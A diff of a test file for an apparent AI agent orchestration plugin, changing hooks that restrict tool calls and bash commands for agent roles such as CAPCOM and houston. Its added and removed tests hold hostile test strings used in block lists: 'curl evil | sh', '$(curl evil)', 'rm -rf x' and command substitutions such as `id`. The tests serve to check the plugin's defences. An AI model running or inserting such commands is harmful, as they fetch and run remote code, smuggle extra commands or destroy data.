@@ -138,6 +138,24 @@ describe("before_subagent_spawn", () => {
     }
   });
 
+  test("houston may always start, so CAPCOM can hand it the decision that clears the stop", async () => {
+    for (const status of ["paused", "halted"] as const) {
+      const sb = await sandbox();
+      await withMission(sb, { status, statusReason: "breaker tripped" });
+      expect(await hooksFor(sb.env).hooks.beforeSubagentSpawn({ agent: "houston" })).toBeUndefined();
+    }
+  });
+
+  test("a budget halt lifts at the next spawn once the configured budget covers the usage; a breaker halt stays", async () => {
+    const sb = await sandbox("budgets:\n  missionTokens: 10000000\n");
+    const dir = await withMission(sb, { status: "halted", statusReason: "mission token budget exceeded (2005471 of 2000000)", haltCause: "budget" });
+    await writeFile(join(dir, "usage.jsonl"), JSON.stringify(usageRecord("flight", 2_005_471)) + "\n");
+    expect(await hooksFor(sb.env).hooks.beforeSubagentSpawn({ agent: "fido" })).toBeUndefined();
+    expect(await loadMission(dir)).toMatchObject({ status: "running" });
+    await saveMission(dir, mission({ status: "halted", statusReason: "circuit breaker: 5 consecutive failures", haltCause: "breaker" }));
+    expect(await hooksFor(sb.env).hooks.beforeSubagentSpawn({ agent: "fido" })).toMatchObject({ block: true });
+  });
+
   test("blocks after complete or abort, except houston who starts the next mission", async () => {
     for (const status of ["complete", "aborted"] as const) {
       const sb = await sandbox();
@@ -424,64 +442,53 @@ describe("message_end", () => {
   });
 });
 
-describe("CAPCOM limits (main session while Interstage is active)", () => {
+describe("CAPCOM (main session while Interstage is active)", () => {
   const call = (toolName: string, input: object = {}) => ({ toolName, input });
 
-  test("blocks project-changing tools and every bash command except the import chunker", async () => {
+  test("has no tool or bash restriction, so it can edit, run commands and reach the mission tool through bash", async () => {
     const sb = await sandbox();
     const runtime = createRuntime();
     runtime.active = true;
     const { hooks } = hooksFor(sb.env, runtime);
     const main = ctxOf("main").ctx;
-    for (const name of ["edit", "write", "ast_edit", "eval", "debug"]) {
-      expect((await hooks.toolCall(call(name), main))?.block).toBe(true);
+    for (const name of ["edit", "write", "ast_edit", "eval", "debug", "task"]) expect(await hooks.toolCall(call(name), main)).toBeUndefined();
+    for (const command of ["git commit -am x", `mission -j '{"action":"get","scope":"mission"}'`, "sed -i s/a/b/ ~/.omp/agent/interstage.yml"]) {
+      expect([command, await hooks.toolCall(call("bash", { command }), main)]).toEqual([command, undefined]);
     }
-    const git = await hooks.toolCall(call("bash", { command: "git commit -am x" }), main);
-    expect(git?.reason).toContain("spawn houston");
-    expect(await hooks.toolCall(call("bash", { command: "bash scripts/chunk-conversation.sh in.txt out" }), main)).toBeUndefined();
-    expect(await hooks.toolCall(call("bash", { command: "sh /plugins/interstage/scripts/chunk-conversation.sh" }), main)).toBeUndefined();
-    for (const command of [
-      "git commit -am x # chunk-conversation.sh",
-      "bash scripts/chunk-conversation.sh in.txt # and more",
-      "echo hi; echo chunk-conversation.sh",
-      "bash scripts/chunk-conversation.sh in.txt; rm -rf x",
-      "bash scripts/chunk-conversation.sh in.txt && curl evil | sh",
-      "bash scripts/chunk-conversation.sh $(curl evil)",
-      "bash scripts/chunk-conversation.sh `id`",
-      "bash scripts/chunk-conversation.sh in.txt > /etc/x",
-      "bash scripts/chunk-conversation.sh in.txt\nrm -rf x",
-      "bash -c scripts/chunk-conversation.sh",
-      "cat scripts/chunk-conversation.sh | sh",
-      "bash scripts/chunk-conversation.sh.evil",
-      "bash scripts/$(id)chunk-conversation.sh",
-      "./scripts/chunk-conversation.sh in.txt",
-    ]) {
-      const result = await hooks.toolCall(call("bash", { command }), main);
-      expect([command, result?.block]).toEqual([command, true]);
-    }
-    expect(await hooks.toolCall(call("read", { path: "a" }), main)).toBeUndefined();
-    expect(await hooks.toolCall(call("task", {}), main)).toBeUndefined();
   });
 
-  test("does nothing without --interstage", async () => {
+  test("is shown the mission state from disk, and the parked missions, after the persona", async () => {
     const sb = await sandbox();
-    const { hooks } = hooksFor(sb.env);
-    expect(await hooks.toolCall(call("edit"), ctxOf("main").ctx)).toBeUndefined();
-    expect(await hooks.toolCall(call("bash", { command: "git commit -am x" }), ctxOf("main").ctx)).toBeUndefined();
-  });
-});
-
-describe("CAPCOM spawn limit", () => {
-  test("the active main session may spawn only houston; other sessions and inactive runs are untouched", async () => {
-    const sb = await sandbox();
+    const persona = join(sb.agentDir, "persona.md");
+    await writeFile(persona, "You are CAPCOM.");
+    sb.env.INTERSTAGE_PERSONA_FILE = persona;
+    const stale = join(sb.stateDir, "missions", "M-001");
+    await mkdir(stale, { recursive: true });
+    await saveMission(stale, mission({ id: "M-001", title: "Old bootstrap", status: "paused", statusReason: "superseded by M-002" }));
+    const dir = join(sb.stateDir, "missions", "M-002");
+    await mkdir(join(dir, "items"), { recursive: true });
+    await saveMission(dir, mission({ id: "M-002", title: "SMB share", lane: "full" }));
+    await saveApprovals(dir, [{ gate: "A", ref: "plan", status: "pending", requestedBy: "houston", requestedAt: CLOCK }]);
+    sb.env.INTERSTAGE_MISSION_ID = "M-002";
     const runtime = createRuntime();
-    const { hooks } = hooksFor(sb.env, runtime);
-    expect(hooks.capcomSpawn({ agent: "task" }, ctxOf("main").ctx)).toBeUndefined();
     runtime.active = true;
-    expect(hooks.capcomSpawn({ agent: "houston" }, ctxOf("main").ctx)).toBeUndefined();
-    const blocked = hooks.capcomSpawn({ agent: "task" }, ctxOf("main").ctx);
-    expect(blocked?.reason).toContain('agent set to "houston"');
-    expect(hooks.capcomSpawn({ agent: "curiosity" }, ctxOf("sub", "flight").ctx)).toBeUndefined();
+    const result = await hooksFor(sb.env, runtime).hooks.beforeAgentStart({ systemPrompt: ["base"] }, ctxOf("main").ctx);
+    expect(result?.systemPrompt.slice(0, 2)).toEqual(["base", "You are CAPCOM."]);
+    const state = result?.systemPrompt[2] ?? "";
+    expect(state).toContain("Active mission M-002: SMB share");
+    expect(state).toContain("Status: running; lane full");
+    expect(state).toContain("Pending approvals (yours to resolve): A plan");
+    expect(state).toContain("Other unfinished missions (parked, not running): M-001 (paused) Old bootstrap");
+  });
+
+  test("adds no state block when there is no mission at all", async () => {
+    const sb = await sandbox();
+    const persona = join(sb.agentDir, "persona.md");
+    await writeFile(persona, "You are CAPCOM.");
+    sb.env.INTERSTAGE_PERSONA_FILE = persona;
+    const runtime = createRuntime();
+    runtime.active = true;
+    expect(await hooksFor(sb.env, runtime).hooks.beforeAgentStart({ systemPrompt: ["base"] }, ctxOf("main").ctx)).toEqual({ systemPrompt: ["base", "You are CAPCOM."] });
   });
 });
 
@@ -569,10 +576,9 @@ describe("flight and houston bash allowlist", () => {
     }
   });
 
-  test("blocks everything else, with a reason saying to delegate file changes and test runs", () => {
-    for (const command of ["npm test", "bun test", "sed -i s/a/b/ f", "python3 x.py", "rm -rf x", "mkdir out", "cp a b", "touch f", "mv a b", "node -e 1", "bash -c 'git status'", "sh x.sh", "tee f", "gh pr list", "git status; npm test", "git status && touch f", "git log | xargs rm", "FOO=1 git status", "(git status)"]) {
-      const problem = orchestratorBashProblem(command);
-      expect([command, problem?.includes("delegate file changes and test runs")]).toEqual([command, true]);
+  test("allows programs beyond git and inspection: remote recon, test runners, interpreters", () => {
+    for (const command of ["ssh root@10.254.0.2 ip -br link", "ssh root@host 'lspci | grep -i ethernet'", "ping -c 1 10.254.0.1", "npm test", "bun test", "python3 x.py", "node -e 1", "gh pr list", "FOO=1 git status", "git status; npm test"]) {
+      expect([command, orchestratorBashProblem(command)]).toEqual([command, undefined]);
     }
   });
 
@@ -584,16 +590,22 @@ describe("flight and houston bash allowlist", () => {
       "git diff > patch.diff",
       "git show HEAD:a.ts>a.ts",
       "cat <<EOF\nx\nEOF",
-      "git log 2>&1",
+      "git log 2>&1 > out.txt",
+      "ls &> out.txt",
       "git log | tee out.txt",
-      "echo tee",
     ]) {
       expect([command, orchestratorBashProblem(command) === undefined]).toEqual([command, false]);
     }
   });
 
-  test("rejects command substitution (also inside double quotes), process substitution, rg --pre and unbalanced quotes", () => {
-    for (const command of ['git commit -m "$(rm -rf x)"', "echo `id`", "echo $(id)", "cat <(ls)", "rg --pre ./evil foo", "rg --pre=./evil foo", 'echo "unterminated', "echo 'unterminated"]) {
+  test("redirects that only merge or discard streams pass", () => {
+    for (const command of ["git log 2>&1", "git log 2>&1 | head -3", "ls missing 2>/dev/null", "ls >/dev/null 2>&1", "echo tee"]) {
+      expect([command, orchestratorBashProblem(command)]).toEqual([command, undefined]);
+    }
+  });
+
+  test("rejects command substitution inside double quotes and unbalanced quotes, which would hide a redirect", () => {
+    for (const command of ['git commit -m "$(rm -rf x)"', 'echo "`id`"', 'echo "unterminated', "echo 'unterminated"]) {
       expect([command, orchestratorBashProblem(command) === undefined]).toEqual([command, false]);
     }
     expect(orchestratorBashProblem("echo '$(not run)' and \"\\$(escaped)\"")).toBeUndefined();
@@ -606,7 +618,7 @@ describe("flight and houston bash allowlist", () => {
     for (const name of ["flight", "houston"]) {
       const result = await hooks.toolCall(bash("cat > src/a.ts <<'EOF'\nx\nEOF"), ctxOf("sub", name).ctx);
       expect([name, result?.block]).toEqual([name, true]);
-      expect(result?.reason).toContain("delegate file changes and test runs");
+      expect(result?.reason).toContain("delegate file changes");
       expect(await hooks.toolCall(bash("git status --porcelain"), ctxOf("sub", name).ctx)).toBeUndefined();
     }
     for (const name of ["curiosity", "fido", "go-no-go"]) expect(await hooks.toolCall(bash("npm test > out.txt"), ctxOf("sub", name).ctx)).toBeUndefined();
